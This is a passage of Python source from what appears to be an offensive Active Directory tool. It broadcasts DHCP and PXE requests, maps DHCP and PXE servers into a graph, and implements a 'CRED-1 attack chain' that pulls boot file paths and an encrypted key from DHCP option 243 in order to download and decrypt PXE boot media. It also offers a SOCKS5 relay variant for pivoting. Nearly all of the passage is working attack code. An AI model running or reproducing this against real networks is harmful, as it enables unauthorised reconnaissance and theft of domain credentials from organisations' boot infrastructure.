        logger.warning(f"[DHCP] Failed to send DHCPINFORM: {e}")
        return 0

    # Collect responses for 10s
    logger.info("[DHCP] Phase 1: Waiting for PXE proxy responses (10s timeout)...")
    responses = _collect_responses(sock, timeout_ms=10000)
    sock.close()

    if not responses:
        logger.info("[DHCP] Phase 1: No responses received")
        return 0

    logger.info(f"[DHCP] Phase 1: Received {len(responses)} response(s)")

    for data, (sender_ip, sender_port) in responses:
        logger.info(f"[DHCP] Phase 1: Response ({len(data)} bytes) from {sender_ip}:{sender_port}")

        parsed = _parse_dhcp_response(data)
        if parsed is None:
            logger.debug(f"[DHCP] Phase 1: Could not parse response from {sender_ip}")
            continue

        _log_parsed_response(parsed, sender_ip)

        is_pxe = _is_pxe_response(parsed)
        hint_ip = _get_server_hint(parsed, sender_ip)
        name = _resolve_ip_to_hostname(hint_ip)

        if is_pxe:
            boot_value = parsed.get("boot_file", "")
            if parsed.get("boot_file_option"):
                boot_value = parsed["boot_file_option"]

            tftp_reach = None
            tftp_ip = parsed.get("tftp_server")
            if tftp_ip:
                logger.info(f"[DHCP] Phase 1: Testing TFTP reachability -> {tftp_ip}:69")
                tftp_reach = tftp_reachable(tftp_ip, boot_value or "pxecheck.bin")
                logger.info(f"[DHCP] Phase 1: TFTP reachable: {tftp_reach}")

            logger.info(
                f"[DHCP] Phase 1: PXE server found: {name} "
                f"(nextServer={parsed['siaddr']} tftp={tftp_ip} "
                f"bootfile={boot_value} vendor={parsed.get('vendor_class')})"
            )

            target = target_manager.add_device(name, source="DHCP-PXE")
            if target and target.sid:
                graph.upsert_node(
                    target.sid,
                    ["Computer", "Base"],
                    properties={
                        "collectionSource": ["DHCP-PXE"],
                        "name": target.ad_object.get("sAMAccountName", "") if target.ad_object else name,
                        "networkBootServer": True,
                        "isPXEServer": True,
                        "pxeVendorClass": parsed.get("vendor_class"),
                        "pxeNextServer": parsed["siaddr"],
                        "pxeBootFile": boot_value,
                        "tftpReachable": tftp_reach,
                    },
                    ad_object=target.ad_object,
                )

            # Attempt CRED-1: request boot files and download media
            _attempt_pxe_media_download(
                hint_ip, mac, graph, target_manager, domain
            )
        else:
            logger.info(f"[DHCP] Phase 1: Non-PXE responder: {name} ({sender_ip})")

    return len(responses)


def _attempt_pxe_media_download(
    pxe_server_ip: str,
    mac: bytes,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
) -> None:
    """
    Send a PXE REQUEST to a specific server and attempt to download boot media.

    This is the CRED-1 attack chain: request boot file location via DHCP,
    download via TFTP, and attempt decryption.
    """
    # Get our local IP for the request
    local_ip = _get_local_ip(pxe_server_ip)
    logger.info(f"[CRED-1] Sending PXE REQUEST to {pxe_server_ip}:4011 (client IP: {local_ip})")

    packet = _build_pxe_request_packet(mac, local_ip, pxe_server_ip)
    logger.info(f"[CRED-1]   Packet size: {len(packet)} bytes")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(10.0)
        sock.sendto(packet, (pxe_server_ip, 4011))

        # Wait for response
        try:
            data, addr = sock.recvfrom(4096)
            logger.info(
                f"[CRED-1]   Received PXE response ({len(data)} bytes) "
                f"from {addr[0]}:{addr[1]}"
            )
        except socket.timeout:
            logger.info(f"[CRED-1]   No PXE REQUEST response from {pxe_server_ip} (timeout)")
            sock.close()
            return
        sock.close()
    except Exception as e:
        logger.warning(f"[CRED-1]   PXE REQUEST failed: {e}")
        return

    parsed = _parse_dhcp_response(data)
    if parsed is None:
        logger.debug("[CRED-1]   Could not parse PXE REQUEST response")
        return

    _log_parsed_response(parsed, pxe_server_ip)

    # Extract boot file info from option 243
    option_243 = parsed.get("option_243")
    if not option_243:
        logger.info("[CRED-1]   No DHCP option 243 in PXE response — cannot determine boot media path")
        return

    var_file, encrypted_key = _extract_boot_files_from_option243(option_243)
    bcd_file = parsed.get("option_252")

    if var_file:
        _process_pxe_media(
            pxe_server_ip, var_file, encrypted_key, bcd_file,
            graph, target_manager, domain,
        )
    else:
        logger.info("[CRED-1]   No variable file path in option 243")


def _attempt_pxe_media_download_socks5(
    pxe_server_ip: str,
    mac: bytes,
    graph: GraphStore,
    target_manager: TargetManager,
    domain: str,
    socks_host: str,
    socks_port: int,
) -> None:
    """Send PXE REQUEST and download boot media via SOCKS5 relay."""
    from lib.socks5_udp import SOCKS5UDPRelay, SOCKS5Error

    local_ip = _get_local_ip(pxe_server_ip)
    logger.info(f"[CRED-1/SOCKS5] Sending PXE REQUEST to {pxe_server_ip}:4011 (client IP: {local_ip})")

    packet = _build_pxe_request_packet(mac, local_ip, pxe_server_ip)
    logger.info(f"[CRED-1/SOCKS5]   Packet size: {len(packet)} bytes")

    try:
        relay = SOCKS5UDPRelay(socks_host, socks_port)
        relay.connect()
    except SOCKS5Error as e:
        logger.error(f"[CRED-1/SOCKS5] SOCKS proxy connect failed: {e}")
        return

    try:
        relay.sendto(packet, pxe_server_ip, 4011)

        result = relay.recvfrom(bufsize=4096, timeout=10.0)
        if result is None:
            logger.info(f"[CRED-1/SOCKS5] No PXE response from {pxe_server_ip} (timeout)")
            relay.close()
            return

        data, sender_ip, sender_port = result
        logger.info(
            f"[CRED-1/SOCKS5] Received PXE response ({len(data)} bytes) "
            f"from {sender_ip}:{sender_port}"
        )
    finally:
        relay.close()

    parsed = _parse_dhcp_response(data)
    if parsed is None:
        logger.debug("[CRED-1/SOCKS5] Could not parse PXE response")
        return

    _log_parsed_response(parsed, pxe_server_ip)

    option_243 = parsed.get("option_243")
    if not option_243:
        logger.info("[CRED-1/SOCKS5] No option 243 in PXE response")
        return

    var_file, encrypted_key = _extract_boot_files_from_option243(option_243)
    bcd_file = parsed.get("option_252")

    if var_file:
        _process_pxe_media_socks5(
            pxe_server_ip, var_file, encrypted_key, bcd_file,
            graph, target_manager, domain, socks_host, socks_port,
        )
    else:
        logger.info("[CRED-1/SOCKS5] No variable file path in option 243")


def _get_local_ip(dest_ip: str) -> str:
    """Get the local IP address that would be used to reach a destination."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((dest_ip, 1))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "0.0.0.0"


# ------------------------------------------------------------------ #
#  Phase 2: Standard DHCP (port 67) — Broadcast mode only
# ------------------------------------------------------------------ #

def _run_dhcp_discover_phase(
    graph: GraphStore,
    target_manager: TargetManager,
    mac: bytes,
    domain: str,
) -> None:
    """
    Phase 2: Send DHCPDISCOVER to broadcast:67 and process responses.

    Only runs if Phase 1 got at least one response.
    Not available in SOCKS5 mode (broadcast doesn't work through SOCKS).
    """
    packet = _build_dhcp_discover_packet(mac)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Try to bind to port 68 (requires root)
        try:
            sock.bind(('0.0.0.0', 68))
            logger.info("[DHCP] Phase 2: Bound to UDP port 68 for DHCP offers")
        except (PermissionError, OSError):
            logger.debug("[DHCP] Phase 2: Could not bind to UDP 68; using ephemeral port")

        logger.info(f"[DHCP] Phase 2: Sending DHCPDISCOVER ({len(packet)} bytes) -> 255.255.255.255:67")
        sock.sendto(packet, ('255.255.255.255', 67))
    except Exception as e:
        logger.warning(f"[DHCP] Phase 2: Failed to send DHCPDISCOVER: {e}")
        return

    # Collect responses for 10s
    logger.info("[DHCP] Phase 2: Waiting for DHCP responses (10s timeout)...")
    responses = _collect_responses(sock, timeout_ms=10000)
    sock.close()

    if not responses:
        logger.info("[DHCP] Phase 2: No responses received")
        return

    logger.info(f"[DHCP] Phase 2: Received {len(responses)} response(s)")

    # Deduplicate by sender IP
    seen: set[str] = set()
    for data, (sender_ip, sender_port) in responses:
        if sender_ip in seen:
            logger.debug(f"[DHCP] Phase 2: Duplicate from {sender_ip}, skipping")
            continue
        seen.add(sender_ip)

        logger.info(f"[DHCP] Phase 2: Response ({len(data)} bytes) from {sender_ip}:{sender_port}")

        parsed = _parse_dhcp_response(data)
        if parsed is None:
            logger.debug(f"[DHCP] Phase 2: Could not parse response from {sender_ip}")
            continue

        _log_parsed_response(parsed, sender_ip)

        # Add DHCP server node
        name = _resolve_ip_to_hostname(sender_ip)
        target = target_manager.add_device(name, source="DHCP-Discover")
        if target and target.sid:
            graph.upsert_node(
                target.sid,
                ["Computer", "Base"],
                properties={
                    "collectionSource": ["DHCP-Discover"],
                    "isDHCPServer": True,
                    "name": target.ad_object.get("sAMAccountName", "") if target.ad_object else name,
                },
                ad_object=target.ad_object,
            )

        # Check for PXE hints in the DHCP offer
        has_pxe_hint = False
        vendor = parsed.get("vendor_class") or ""
        if "PXEClient" in vendor:
            has_pxe_hint = True
        if parsed.get("boot_file_option"):
            has_pxe_hint = True
        siaddr = parsed.get("siaddr", "0.0.0.0")
        if siaddr and siaddr != "0.0.0.0":
            has_pxe_hint = True
        tftp = parsed.get("tftp_server")
        if tftp:
            has_pxe_hint = True

        if has_pxe_hint:
            logger.info(f"[DHCP] Phase 2: PXE hint detected in DHCP offer from {sender_ip}")
            pxe_host = tftp
            if not pxe_host and siaddr and siaddr != "0.0.0.0":
                pxe_host = siaddr
            if pxe_host:
                pxe_name = _resolve_ip_to_hostname(pxe_host)
                pxe_target = target_manager.add_device(pxe_name, source="DHCP-Discover")

                rrq_file = "pxecheck.bin"
                boot_opt = parsed.get("boot_file_option")
                if boot_opt:
                    rrq_file = boot_opt

                tftp_reach = None
                if tftp:
                    logger.info(f"[DHCP] Phase 2: Testing TFTP reachability -> {tftp}:69")
                    tftp_reach = tftp_reachable(tftp, rrq_file)
                    logger.info(f"[DHCP] Phase 2: TFTP reachable: {tftp_reach}")

                if pxe_target and pxe_target.sid:
                    graph.upsert_node(
                        pxe_target.sid,
                        ["Computer", "Base"],
                        properties={
                            "collectionSource": ["DHCP-Discover"],
                            "name": pxe_target.ad_object.get("sAMAccountName", "") if pxe_target.ad_object else pxe_name,
                            "networkBootServer": True,
                            "isPXEServer": True,
                            "pxeVendorClass": parsed.get("vendor_class"),
                            "pxeNextServer": siaddr,
                            "pxeBootFile": boot_opt,
                            "tftpReachable": tftp_reach,
                        },
                        ad_object=pxe_target.ad_object,
                    )
        else:
            logger.info(f"[DHCP] Phase 2: DHCP server {name} ({sender_ip}) — no PXE hints")


# ------------------------------------------------------------------ #
#  Shared Helpers
# ------------------------------------------------------------------ #

def _collect_responses(
    sock: socket.socket,
    timeout_ms: int,
) -> list[tuple[bytes, tuple[str, int]]]:
    """
    Collect UDP responses on a socket within a timeout window.

    Returns list of (data, (sender_ip, sender_port)) tuples.
    """
    responses = []
    deadline = time.monotonic() + timeout_ms / 1000.0
    remaining = deadline - time.monotonic()
    if remaining > 0:
        sock.settimeout(remaining)

    while time.monotonic() < deadline:
        try:
            data, addr = sock.recvfrom(4096)
            if data:
                responses.append((data, addr))
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            sock.settimeout(remaining)
        except socket.timeout:
            break
        except OSError:
            break

    return responses
